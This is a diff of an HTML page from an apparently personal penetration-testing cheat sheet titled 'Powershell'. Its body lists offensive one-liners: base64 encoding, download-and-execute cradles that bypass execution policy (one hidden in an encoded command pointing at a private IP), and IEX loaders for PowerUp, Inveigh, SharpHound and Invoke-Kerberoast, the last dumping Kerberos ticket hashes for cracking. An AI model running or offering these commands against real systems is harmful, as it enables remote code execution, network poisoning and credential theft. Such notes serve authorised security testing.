@@ -26,7 +26,7 @@
 
 
 
-<link rel="stylesheet" href="https://kaluche.github.io/main.min.73f55a8d452be4a71b2960620b80252cf69abd84d63fe7501abf0a39b1a70a78.css">
+<link rel="stylesheet" href="https://kaluche.github.io/main.min.2f0d18b84270567c723bff340b09ab08db3a7634237cd9667d052eb6b14669b8.css">
 
 
     
@@ -44,6 +44,7 @@
     <meta name="msapplication-TileColor" content="#252627">
     <meta name="theme-color" content="#252627">
 
+
 <meta itemprop="name" content="Powershell">
 <meta itemprop="description" content="
 Oneliners/commands for powershell.
@@ -52,7 +53,7 @@ Oneliners/commands for powershell.
 
 <meta itemprop="datePublished" content="2020-02-08T17:21:41&#43;01:00" />
 <meta itemprop="dateModified" content="2020-02-08T17:21:41&#43;01:00" />
-<meta itemprop="wordCount" content="91">
+<meta itemprop="wordCount" content="95">
 
 
 
@@ -149,36 +150,48 @@ Oneliners/commands for powershell.
 
 <ul>
 <li><p>Simple string encode</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Convert]</span>::ToBase64String(<span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetBytes(<span style="color:#e6db74">&#34;ENCODE THIS :  </span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">STR</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74"> !&#34;</span>))</code></pre></div></li>
-
-<li><p>Simple string decode</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String(<span style="color:#e6db74">&#34;RU5DT0RFIFRISVMgOiAgIlNUUiIgIQ==&#34;</span>))</code></pre></div></li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Convert]</span>::ToBase64String(<span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetBytes(<span style="color:#e6db74">&#34;ENCODE THIS :  </span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">STR</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74"> !&#34;</span>))</code></pre></div>
+<ul>
+<li>Simple string decode
+<code>powershell
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;RU5DT0RFIFRISVMgOiAgIlNUUiIgIQ==&quot;))
+</code></li>
+</ul></li>
 </ul>
 
 <h2 id="download-exec">Download/Exec</h2>
 
 <ul>
 <li><p>HTTP cleartext dl/exec</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -c <span style="color:#e6db74">&#34;(New-Object Net.WebClient).DownloadString(&#39;http://IP:PORT/a.html&#39;)&#34;</span></code></pre></div></li>
-
-<li><p>HTTP encoded dl/exec</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA1AC8AYQAuAGgAdABtAGwAJwApAA===</code></pre></div></li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -c <span style="color:#e6db74">&#34;(New-Object Net.WebClient).DownloadString(&#39;http://IP:PORT/a.html&#39;)&#34;</span></code></pre></div>
+<ul>
+<li>HTTP encoded dl/exec
+<code>powershell
+powershell -Sta -Nop -exec bypass -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA1AC8AYQAuAGgAdABtAGwAJwApAA===
+</code></li>
+</ul></li>
 </ul>
 
 <h2 id="exec-useful-modules">Exec useful modules</h2>
 
 <ul>
 <li><p>PowerUp.ps1 / Invoke-Allchecks</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span></code></pre></div></li>
-
-<li><p>Inveigh.ps1 / Responder</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y  -Proxy Y -LogOutput Y -FileOutput Y&#34;</span></code></pre></div></li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span></code></pre></div>
+<ul>
+<li>Inveigh.ps1 / Responder
+<code>powershell
+powershell.exe -exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y  -Proxy Y -LogOutput Y -FileOutput Y&quot;
+</code></li>
+</ul></li>
 
 <li><p>Bloodhound</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1&#39;);Invoke-BloodHound&#34;</span></code></pre></div></li>
-
-<li><p>Invoke-Kerberoast</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast -OutputFormat hashcat  | fl&#34;</span></code></pre></div></li>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1&#39;);Invoke-BloodHound&#34;</span></code></pre></div>
+<ul>
+<li>Invoke-Kerberoast
+<code>powershell
+powershell.exe -exec Bypass -C &quot;IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat  | fl&quot;
+</code></li>
+</ul></li>
 </ul>
             </div>
         </article>
@@ -190,7 +203,7 @@ Oneliners/commands for powershell.
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://kaluche.github.io/tags/powershell">powershell</a></span><span class="tag"><a href="https://kaluche.github.io/tags/windows">windows</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>91 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>95 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-02-08 17:21 &#43;0100</p>
         </div>
@@ -250,7 +263,7 @@ Oneliners/commands for powershell.
 
 
 
-<script type="text/javascript" src="https://kaluche.github.io/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+<script type="text/javascript" src="https://kaluche.github.io/bundle.min.8047d1b063234db7e4f910f9d54abd62686428b775f14770e6c6314980002e1d3014e6f9d5df0df37d0a5fd3a15f20b320fb949c4f014e74059de1c57eb0e40a.js" integrity="sha512-gEfRsGMjTbfk&#43;RD51Uq9YmhkKLd18Udw5sYxSYAALh0wFOb51d8N830KX9OhXyCzIPuUnE8BTnQFneHFfrDkCg=="></script>
 
 
 
